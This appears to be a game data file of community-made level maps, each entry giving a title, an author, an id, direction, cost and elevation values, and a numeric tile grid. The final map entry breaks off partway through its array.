maps.push({name="A Pencil",author="Not Pencil",id="#1663617361",direction="right",cost=89,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,100,0,0,0,100,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,39,0,0,0,39,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,39,0,0,0,39,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,19,19,39,39,39,39,39,39,39,39,39,59,59,0,0,0,0,0,0,119,19,19,39,39,39,39,39,39,39,39,39,59,59,1,0,0,0,0,0,119,19,19,39,39,39,39,39,39,39,39,39,59,59,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,0,0,0,39,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,39,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,39,2,0,0,0,0,0,0,39,0,0,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,0,0,0,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Consequences",author="Luffaren",id="#1663619049",direction="right",cost=309,elevation=0,map=[1,9,2,2,9,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,9,9,9,9,91,9,9,9,95,9,131,1,0,0,0,0,0,0,0,1,9,9,9,9,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,1,0,1,1,1,1,1,1,1,1,1,0,0,0,0,1,90,9,90,9,1,0,1,132,1,65,65,65,65,65,1,0,0,0,0,1,1,9,1,1,1,0,1,9,1,65,65,65,65,65,1,0,0,0,0,0,1,11,1,0,0,0,1,96,1,65,65,65,65,65,1,1,1,1,1,0,1,11,1,0,0,0,1,9,9,9,9,9,9,9,9,9,9,9,1,0,1,11,1,0,0,0,1,9,9,9,94,9,9,9,9,9,9,9,9,0,1,11,1,1,1,1,1,90,9,9,9,9,134,9,9,9,9,9,9,0,1,11,0,0,9,9,9,9,9,9,9,134,97,16,4,9,9,9,2,0,1,1,1,1,1,1,1,90,9,9,9,9,134,9,9,9,9,9,2,0,0,0,0,0,0,0,1,9,9,9,93,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,1,96,1,65,65,65,65,65,1,1,1,1,1,0,0,0,0,0,0,0,1,9,1,65,65,65,65,65,1,0,0,0,0,0,0,0,0,0,0,0,1,132,1,65,65,65,65,65,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Destroy The Ring",author="sivi",id="#1663624000",direction="left",cost=369,elevation=1,map=[0,0,0,24,24,24,24,24,24,24,24,24,24,2,2,24,0,0,0,0,0,24,24,24,17,17,18,19,19,24,24,24,24,14,14,24,0,0,0,0,24,24,16,16,17,17,18,19,19,24,24,24,15,15,15,24,0,0,0,0,24,15,16,16,17,17,24,96,96,24,24,17,15,15,24,24,0,0,0,0,2,15,16,16,24,24,24,19,19,19,19,17,17,24,24,0,0,0,0,0,2,15,16,24,24,0,24,19,19,19,19,19,24,24,0,0,0,0,0,0,24,24,24,24,0,0,24,19,19,19,19,19,24,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,119,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,119,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,75,75,75,5,19,5,75,75,75,1,0,0,0,0,0,0,0,0,0,1,75,75,75,5,19,5,75,75,75,1,0,0,0,0,0,0,0,0,1,1,75,75,75,5,19,5,75,75,75,1,1,0,0,0,0,0,0,0,1,75,75,75,75,5,19,5,75,75,75,75,1,0,0,0,0,0,0,0,1,75,75,75,5,19,19,19,5,75,75,75,1,0,0,0,0,0,0,0,1,75,75,75,5,19,97,19,5,75,75,75,1,0,0,0,0,0,0,0,1,75,75,75,5,19,19,19,5,75,75,75,1,0,0,0,0,0,0,0,1,75,75,75,75,5,5,5,75,75,75,75,1,0,0,0,0,0,0,0,1,1,75,75,75,75,5,75,75,75,75,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0]});
maps.push({name="Lilypads",author="ZpLit",id="#1663626715",direction="forward",cost=248,elevation=9,map=[0,0,0,0,0,0,0,13,47,2,2,47,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,47,47,47,47,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,46,46,46,46,12,0,0,0,0,0,0,0,0,0,0,0,0,28,27,26,46,46,46,46,26,27,28,0,0,0,0,0,0,0,100,0,0,28,1,1,45,45,45,45,1,1,28,0,0,100,0,0,0,0,24,0,0,29,1,1,45,45,45,45,1,1,29,0,0,24,0,0,0,1,0,0,0,30,30,31,45,45,45,45,31,30,30,0,0,0,1,0,1,23,0,0,92,23,1,11,45,45,45,45,11,1,23,92,0,0,23,1,0,1,0,0,0,1,0,12,46,46,46,46,12,0,1,0,0,0,1,0,0,1,0,0,0,1,0,13,47,47,47,47,13,0,1,0,0,0,1,0,1,23,92,0,0,23,1,14,48,48,48,48,14,1,23,0,0,92,23,1,0,1,0,0,0,1,0,15,49,49,49,49,15,0,1,0,0,0,1,0,0,1,0,0,0,1,0,16,50,50,50,50,16,0,1,0,0,0,1,0,1,23,0,0,92,23,1,17,51,51,51,51,17,1,23,92,0,0,23,1,0,1,0,0,0,1,0,18,52,52,52,52,18,0,1,0,0,0,1,0,0,1,0,0,0,1,0,19,53,53,53,53,19,0,1,0,0,0,1,0,1,23,92,0,0,23,1,20,54,54,54,54,20,1,23,0,0,92,23,1,0,1,0,0,0,1,0,21,55,55,55,55,21,0,1,0,0,0,1,0,0,22,22,22,22,22,22,22,16,16,16,16,22,22,22,22,22,22,22,0,0,0,0,0,0,0,0,22,88,2,2,88,22,0,0,0,0,0,0,0]});
maps.push({name="Crossroads",author="sivi",id="#1663635651",direction="forward",cost=339,elevation=9,map=[1,105,2,2,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,45,45,45,45,1,0,0,0,20,20,20,19,18,17,16,16,16,16,0,1,6,94,94,6,1,0,0,0,20,97,20,90,90,90,90,16,93,16,0,1,7,45,45,7,1,0,0,0,20,20,20,19,18,17,16,16,16,16,0,1,8,45,45,8,1,0,0,0,20,20,20,0,0,0,0,15,90,15,0,1,9,45,45,9,1,1,1,1,120,120,120,1,1,1,0,14,90,14,0,1,10,45,45,10,1,0,1,1,120,120,120,1,1,1,0,14,14,14,0,1,11,45,45,11,1,1,1,0,67,67,67,0,1,1,0,14,90,14,0,1,11,45,45,11,111,111,129,0,0,0,0,67,114,96,14,14,14,14,0,1,11,45,45,11,111,111,129,0,0,0,0,67,114,96,14,14,14,14,0,1,11,45,45,11,111,111,129,0,0,0,0,67,114,96,14,14,90,14,0,1,1,105,105,1,1,1,1,0,0,0,0,0,1,1,0,14,14,14,0,0,1,106,106,1,0,0,1,1,126,126,126,1,1,1,0,14,14,14,0,0,1,107,107,1,0,0,0,1,117,117,117,1,1,1,0,14,90,14,0,0,1,108,108,1,0,0,0,1,116,90,116,1,0,0,0,14,14,14,0,0,1,109,109,1,1,1,1,1,115,90,115,1,0,0,0,14,14,14,0,0,1,110,110,110,111,112,113,114,115,115,115,1,0,0,0,14,90,14,0,0,1,110,110,90,90,90,90,90,115,115,115,1,0,0,0,14,14,14,0,0,1,110,110,110,111,112,113,114,115,115,115,1,0,0,0,14,14,14,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,2,2,14,0]});
maps.push({name="XD First Map",author="jeSUS",id="#1663645224",direction="left",cost=240,elevation=4,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,38,0,0,0,38,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,38,38,38,0,0,0,0,1,1,1,0,0,0,0,141,141,0,0,0,0,0,100,0,0,0,0,0,1,100,9,0,0,0,0,9,9,0,0,0,0,38,0,38,0,0,1,0,1,9,9,0,0,0,0,9,9,1,0,0,38,0,0,0,38,1,102,15,15,141,9,0,0,0,0,95,95,1,93,0,0,0,0,0,0,0,1,0,1,9,9,1,1,1,1,9,9,1,18,0,0,0,0,0,0,0,1,1,1,9,95,9,143,9,96,9,9,1,0,18,92,12,12,12,12,0,1,9,101,9,95,9,143,9,96,9,9,1,0,0,12,76,76,76,12,0,1,9,1,9,9,1,1,1,1,1,9,1,0,0,0,11,76,11,0,0,1,9,1,9,0,0,0,0,0,1,4,1,0,0,0,0,10,0,0,0,1,9,1,9,29,0,30,0,31,1,19,1,0,0,9,0,0,0,0,0,1,143,1,9,0,0,0,0,0,1,19,1,0,0,0,0,0,0,0,0,1,9,1,9,0,0,35,0,33,1,97,1,2,9,9,9,9,9,9,98,9,9,101,9,0,36,0,0,0,1,1,1,2,9,9,9,9,9,9,98,9,9,101,9,0,38,0,0,0,38,0,0,0,1,1,1,1,1,1,1,9,1,33,0,38,100,38,0,38,0,0,38,0,0,0,0,0,0,0,1,99,1,0,0,0,38,0,0,0,0,38,102]});
maps.push({name="Just defend",author="lennyface",id="#1663701755",direction="forward",cost=117,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,93,0,0,7,6,5,5,0,0,0,0,0,0,0,0,0,0,0,0,97,5,5,0,7,6,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,94,0,0,7,6,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,88,6,0,5,0,5,5,0,0,0,0,0,0,0,0,0,0,0,99,5,88,6,5,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,88,6,0,0,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,5,5,0,0,0,0,0,0,5,5,6,6,0,0,0,0,0,0,0,0,91,91,0,0,5,0,5,0,5,88,6,102,0,0,0,0,0,0,0,0,101,101,0,0,0,0,0,0,5,5,6,6,5,0,5,0,5,0,5,0,5,5,0,0,0,0,0,0,0,0,0,0,104,0,5,5,0,5,0,0,91,91,0,0,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,103,103,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="3way",author="tilgep",id="#1663703895",direction="left",cost=173,elevation=-1,map=[0,0,1,0,0,0,1,1,1,1,1,1,1,0,0,1,7,2,2,7,0,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,7,7,7,7,1,0,0,130,130,130,130,130,130,130,130,0,128,7,1,7,7,7,7,0,1,0,0,0,1,1,1,1,1,1,1,1,0,7,7,7,7,7,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,7,7,7,7,0,0,0,1,0,0,1,0,0,0,12,12,12,12,0,0,125,7,127,127,0,0,0,1,0,0,1,0,0,0,12,100,12,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,0,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,0,6,0,7,0,6,0,0,0,0,0,0,0,0,0,6,0,0,6,6,0,0,6,0,6,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,0,0,6,6,6,6,0,0,0,0,0,0,0,0,6,6,6,6,6,6,0,6,6,6,6,0,6,6,6,0,0,0,0,0,6,6,6,88,6,6,0,2,6,6,6,6,6,6,0,0,0,0,0,0,128,6,6,6,6,0,0,2,6,6,6,6,6,7,0,0,0,0,0,0,128,6,6,0,0,0,0,0,0,6,6,6,6,6,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Divide and Conquer",author="jeSUS",id="#1663714490",direction="forward",cost=402,elevation=6,map=[97,93,38,38,38,38,37,36,0,2,2,0,0,0,0,37,38,39,93,97,0,0,1,11,11,0,0,35,0,5,5,0,0,0,0,36,0,0,0,104,38,1,92,11,11,32,33,34,1,5,5,1,0,0,0,35,0,0,0,39,0,0,0,0,0,0,0,1,5,141,3,5,1,0,0,34,0,0,0,39,34,0,0,0,0,0,0,1,3,11,11,141,1,0,0,33,0,0,0,0,0,0,0,0,0,0,1,5,4,11,11,4,5,1,0,32,0,0,0,34,0,0,0,0,0,0,0,1,1,11,11,1,1,0,0,31,0,0,0,0,11,11,11,11,11,11,103,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,103,11,11,11,11,11,11,11,11,11,11,11,11,11,0,98,98,98,1,98,1,1,96,96,96,96,1,1,1,98,1,98,98,98,0,0,135,0,1,11,1,1,0,11,11,0,1,1,1,11,1,0,135,0,0,0,135,0,1,11,1,1,0,0,0,0,1,1,1,11,1,0,135,0,0,0,135,0,1,13,1,1,0,0,0,0,1,1,1,13,1,0,135,0,0,0,135,0,1,11,1,1,0,92,92,0,1,1,1,11,1,0,135,0,1,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,1,4,11,11,11,11,11,11,99,11,11,11,11,11,11,11,11,11,11,11,1,18,76,76,76,76,76,76,1,98,98,98,98,1,19,17,15,13,12,141,1,141,76,76,76,76,76,1,1,101,101,101,101,1,19,21,21,23,24,24,1,24,1,1,1,1,1,1,76,11,11,11,11,76,1,1,1,1,1,102,24,102,100,24,0,19,14,14,76,11,2,2,11,76,14,0,19,19,0,100]});
maps.push({name="Over And Under",author="sivi",id="#1663759130",direction="forward",cost=344,elevation=0,map=[0,0,0,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,90,114,114,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,1,90,114,114,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,127,127,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,1,90,114,114,114,114,90,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,51,51,1,1,1,1,1,1,1,1,1,1,97,139,1,1,18,1,1,51,51,51,51,1,1,12,1,1,139,97,1,1,19,5,5,5,5,3,117,51,51,51,51,111,3,5,5,5,5,13,1,1,1,1,18,1,1,1,1,51,51,51,51,1,1,1,1,12,1,1,1,1,1,1,1,1,1,1,1,51,51,51,51,1,1,1,1,1,1,1,1,1,1,1,12,1,1,1,1,51,51,51,51,1,1,1,1,18,1,1,1,1,13,5,5,5,5,3,111,51,51,51,51,117,3,5,5,5,5,19,1,1,97,139,1,1,12,1,1,51,127,127,51,1,1,18,1,1,139,97,1,1,1,1,1,1,1,1,1,90,139,139,90,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1,1,96,96,96,96,1,1,1,1,1,0,0,0,0,0,0,1,111,93,93,1,54,54,54,54,1,94,94,111,1,0,0,0,0,0,0,1,136,111,111,91,114,114,114,114,91,111,111,133,1,0,0,0,0,0,0,1,111,93,93,1,134,114,114,137,1,94,94,111,1,0,0,0,0,0,0,1,1,1,1,1,1,2,2,1,1,1,1,1,1,0,0,0]});
maps.push({name="Going Up",author="sivi",id="#1663774020",direction="right",cost=278,elevation=18,map=[1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,1,105,105,1,1,1,17,94,17,17,17,17,17,17,139,17,1,0,0,1,11,45,45,11,111,111,51,51,51,11,12,13,14,15,16,17,1,0,0,1,94,45,45,11,111,111,51,51,51,11,12,13,14,15,16,17,1,0,0,1,11,45,45,11,1,1,17,17,17,17,17,17,17,17,139,17,1,0,0,1,11,5,5,11,1,1,117,117,1,1,1,1,1,1,1,1,1,1,1,1,11,6,6,11,1,1,117,117,1,1,0,0,0,0,1,90,88,90,1,1,11,7,7,11,1,23,57,57,23,23,57,57,57,57,23,23,23,23,2,1,11,8,8,11,1,132,57,57,23,23,57,57,57,57,23,23,23,23,2,1,11,9,9,11,1,23,57,57,23,1,117,117,117,117,1,90,88,90,1,1,139,10,10,139,1,23,17,17,23,1,131,93,93,131,1,1,1,1,1,1,11,11,11,11,1,23,18,18,23,1,1,1,1,1,1,0,0,0,0,1,1,1,1,1,1,23,19,19,23,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,23,20,20,23,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,23,21,21,23,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,139,22,22,139,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,23,23,23,23,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ups And Downs",author="jeSUS",id="#1663789022",direction="left",cost=401,elevation=16,map=[1,1,1,1,1,0,0,22,22,22,0,0,0,16,16,16,0,2,2,0,21,21,21,21,0,0,0,3,3,3,0,0,0,3,3,3,0,5,5,0,2,21,21,21,0,0,0,55,55,55,0,0,0,49,49,49,0,5,5,0,2,21,21,21,1,0,0,55,55,55,0,0,0,49,49,49,0,5,5,0,95,95,95,95,1,0,21,55,55,55,0,0,0,49,49,49,0,5,5,27,21,21,21,21,1,21,132,54,54,54,0,0,0,48,48,48,0,5,5,0,20,20,20,20,1,1,1,54,54,54,1,0,1,48,48,48,1,5,5,29,20,20,20,20,1,0,1,54,54,54,1,0,1,48,48,48,1,5,5,0,20,20,20,20,1,0,1,53,53,53,1,0,1,47,47,47,1,5,5,31,20,76,76,20,1,0,1,95,95,95,1,0,1,95,95,95,1,5,5,0,20,20,20,20,1,0,1,53,53,53,1,0,1,47,47,47,1,5,5,33,19,19,19,19,1,0,1,52,52,52,1,0,1,46,46,46,1,5,5,0,95,95,95,95,1,0,1,52,52,52,1,0,1,46,46,46,1,5,5,33,19,19,19,19,1,0,1,52,52,52,1,11,1,46,46,46,1,5,5,93,96,96,96,96,1,0,1,51,51,51,1,131,1,45,45,45,1,5,5,33,18,18,18,97,1,1,1,51,51,51,1,96,11,45,45,45,1,5,5,0,18,18,18,18,1,1,17,51,51,51,1,11,11,45,45,45,1,5,5,0,1,17,17,17,17,95,17,51,51,51,51,95,11,45,45,45,95,5,5,0,1,17,17,17,17,95,17,51,51,51,51,95,11,45,45,45,95,5,5,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0]});
maps.push({name="Boring I Guess",author="jeSUS",id="#1663814199",direction="left",cost=226,elevation=5,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,5,5,0,0,0,30,97,0,0,1,1,1,1,1,5,5,5,5,1,0,5,5,0,0,29,0,0,0,0,1,131,131,1,1,5,132,132,5,1,0,5,5,0,0,0,30,0,0,0,1,95,95,1,0,5,5,5,5,0,0,5,5,0,27,0,0,0,0,0,0,5,5,0,0,0,5,5,0,0,1,5,5,0,0,0,30,0,0,0,0,5,5,0,0,0,5,5,0,0,1,5,5,0,0,0,0,96,0,0,0,5,5,0,0,0,6,6,0,0,1,5,5,5,5,5,5,5,96,5,5,5,5,0,0,0,6,6,0,0,1,5,5,5,5,5,5,5,96,5,5,5,5,0,0,0,7,7,0,0,1,1,1,1,1,1,1,96,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,30,30,0,0,0,0,0,0,0,98,0,0,1,8,8,0,0,0,0,0,0,0,0,30,1,10,10,10,98,10,10,10,9,86,9,0,0,0,0,0,0,0,0,0,1,10,10,10,98,10,10,10,9,9,9,0,0,0,0,0,0,0,0,30,1,10,10,0,0,98,0,0,0,0,0,0,0,0,0,0,92,0,0,102,1,10,10,0,0,0,0,0,0,0,29,0,0,2,10,101,10,1,1,1,1,10,10,0,0,0,0,0,32,0,0,0,0,2,10,101,10,10,12,10,10,10,10,0,0,0,0,0,0,0,31,0,0,0,10,101,10,1,1,1,1,10,10,0,0,0,99,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,34,0,33,0,0]});
maps.push({name="Temple Of Secrets",author="sivi",id="#1663816162",direction="forward",cost=359,elevation=0,map=[0,36,0,0,0,0,0,94,1,5,2,2,5,1,3,0,0,0,0,0,0,1,1,116,116,1,1,1,1,132,5,5,5,1,0,0,0,0,0,0,36,1,1,90,116,116,116,16,90,5,5,90,6,1,94,14,14,0,0,0,0,1,1,116,116,116,116,16,5,5,5,5,7,1,93,14,131,0,0,0,0,1,1,116,116,116,1,16,88,5,5,88,8,1,94,14,14,0,0,0,36,1,1,116,116,116,1,16,5,5,5,5,9,1,0,0,0,0,0,0,0,1,1,90,116,116,1,15,90,5,5,90,10,1,1,1,1,1,1,1,0,1,1,116,116,116,1,15,14,13,12,11,11,1,1,93,94,93,1,1,36,1,1,96,96,96,1,1,1,1,1,1,1,1,1,124,124,124,1,1,0,1,1,116,116,116,24,24,24,24,24,24,24,24,24,24,24,24,24,1,0,1,1,90,116,116,0,77,77,77,77,77,77,77,77,77,3,77,77,1,36,1,1,116,116,116,1,0,0,1,0,0,1,0,0,1,0,0,0,1,0,1,1,116,116,116,115,114,113,112,111,110,109,108,107,106,105,105,105,1,0,1,1,90,116,116,115,114,113,112,111,110,109,108,107,106,105,105,105,1,36,1,1,44,93,44,1,0,0,1,0,0,1,0,0,1,0,5,5,1,0,1,1,0,0,0,3,0,0,0,0,0,0,0,0,0,0,5,5,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,36,116,116,116,97,116,116,0,0,5,5,5,5,5,5,5,5,5,5,1,36,116,116,116,116,116,116,0,0,90,65,65,90,5,5,90,65,65,90,1,0,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1]});
maps.push({name="can u guys defense",author="alli",id="#1663828053",direction="forward",cost=164,elevation=2,map=[0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,26,26,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,26,26,26,26,0,0,0,0,0,0,0,0,0,34,93,94,34,0,0,0,27,27,27,27,0,0,0,0,0,0,0,0,0,34,94,93,34,0,0,0,127,127,127,127,0,0,0,0,0,0,0,0,0,34,34,127,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,0,0,0,0,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,0,0,0,0,33,0,0,0,0,0,0,0,0,37,1,24,0,0,0,33,0,0,0,0,33,0,0,0,0,0,0,0,0,32,32,32,24,1,0,33,27,27,27,27,33,0,0,0,0,0,0,0,0,0,1,32,0,0,128,33,27,27,27,27,33,129,0,0,0,0,0,135,33,0,0,1,24,24,1,33,7,7,7,7,33,1,24,1,0,0,1,135,33,0,32,0,32,0,0,3,7,7,7,7,3,0,0,0,0,0,1,135,33,0,0,0,0,0,0,0,7,7,7,7,0,0,0,0,0,0,0,135,33,0,0,0,0,0,0,0,7,7,7,7,0,0,135,135,135,135,135,135,33,0,0,0,0,0,0,0,7,7,7,7,0,0,0,0,0,0,33,33,33,0,0,0,0,0,0,0,7,7,7,7,0,0,0,0,0,0,33,100,33,0,0,0,0,0,0,0,7,2,2,7,0,0,0,0,0,0,33,33,33]});
maps.push({name="walk between tp",author="alli",id="#1663834057",direction="left",cost=261,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,14,14,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,2,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,2,14,14,14,14,14,14,14,14,14,14,14,14,14,132,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,0,0,0,100,14,131,131,131,131,131,0,0,0,0,0,0,0,126,0,0,0,0,0,14,14,131,131,131,131,131,0,0,0,0,0,0,14,14,0,1,1,1,1,0,1,131,131,1,0,0,0,0,0,0,0,14,93,94,14,131,131,131,1,1,1,131,131,1,0,0,0,0,0,0,0,14,94,93,14,131,131,131,131,131,131,131,131,1,0,0,0,0,0,0,0,0,14,14,0,1,131,131,131,131,131,131,131,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="Dyt i bamsen",author="Frid",id="#1663850642",direction="forward",cost=183,elevation=9,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,5,5,0,0,0,0,18,18,0,18,0,0,0,0,0,18,18,3,0,0,5,5,0,0,0,0,18,18,0,0,0,0,18,0,0,18,18,0,0,0,5,5,0,0,0,0,18,18,0,18,0,0,0,0,0,18,18,3,0,0,5,5,0,0,0,0,18,18,0,0,0,0,18,0,0,18,18,0,0,1,45,45,7,0,0,22,95,95,22,0,0,0,0,0,0,0,0,0,25,1,45,45,7,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,1,45,45,9,0,0,0,97,18,0,0,0,0,0,0,0,0,0,0,0,105,45,45,9,0,0,0,0,0,0,22,0,0,0,0,20,0,25,0,0,1,45,45,11,0,0,0,15,0,0,0,0,95,22,0,0,0,19,0,26,1,45,45,11,0,0,0,15,0,0,0,22,99,95,0,26,0,28,0,0,1,46,46,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,17,1,1,47,47,0,0,0,0,0,14,0,0,0,0,0,27,1,9,9,96,49,49,48,48,0,0,0,0,0,14,0,0,0,18,0,1,9,9,9,96,49,49,49,49,0,0,0,0,14,0,0,0,10,98,9,9,9,9,9,96,49,49,49,49,0,0,0,0,14,0,0,11,10,98,9,9,9,9,9,18,18,18,18,18,0,0,0,0,14,13,12,11,3,18,0,0,0,0,0,28,0,27,0,26,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,2,2,0,0,0,0,18,0,0,18,0,0,18,0,0,18,0,18,100]});
maps.push({name="Bridges To Nowhere",author="jeSUS",id="#1663885187",direction="forward",cost=221,elevation=0,map=[0,0,32,0,0,0,0,0,0,2,2,0,0,0,0,0,0,32,0,30,0,30,0,0,0,0,36,0,0,5,5,0,0,0,0,33,0,0,0,30,0,0,0,0,34,0,0,0,7,5,5,7,0,131,0,0,0,0,0,0,0,28,0,0,0,0,38,0,0,5,5,0,0,44,0,0,35,0,0,29,0,0,0,0,0,0,0,0,7,5,5,7,0,0,37,0,0,0,0,0,0,28,0,0,42,0,40,0,0,26,26,0,100,0,0,0,39,0,0,27,0,0,0,0,0,0,0,0,0,27,27,0,44,0,0,0,0,40,0,0,0,27,0,133,44,100,0,0,0,26,26,0,97,0,43,0,41,0,0,26,96,96,96,96,0,0,7,7,0,5,5,7,0,7,0,0,0,0,0,0,5,5,5,26,27,26,5,5,5,5,5,5,5,5,5,26,27,26,5,5,5,5,5,26,27,26,5,5,5,5,5,5,5,5,5,26,27,26,5,5,7,5,5,0,0,0,0,7,7,7,7,7,0,7,0,0,0,7,5,5,0,5,5,0,0,0,0